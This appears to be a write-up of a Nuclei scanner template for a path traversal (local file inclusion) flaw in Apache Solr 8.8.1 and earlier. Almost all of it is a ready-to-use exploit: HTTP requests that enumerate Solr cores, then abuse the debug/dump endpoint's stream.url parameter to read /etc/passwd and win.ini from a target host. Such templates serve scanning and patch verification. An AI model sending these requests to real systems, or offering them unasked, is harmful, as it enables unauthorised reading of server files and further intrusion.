# Nuclei Template: Apache Solr <=8.8.1 - Local File Inclusion
**Template ID:** apache-solr-file-read
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`apache-solr-file-read.yaml`)

## Vulnerability Information & PoC

## Description
Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close
```

## References
- https://twitter.com/Al1ex4/status/1382981479727128580
- https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
- https://twitter.com/sec715/status/1373472323538362371
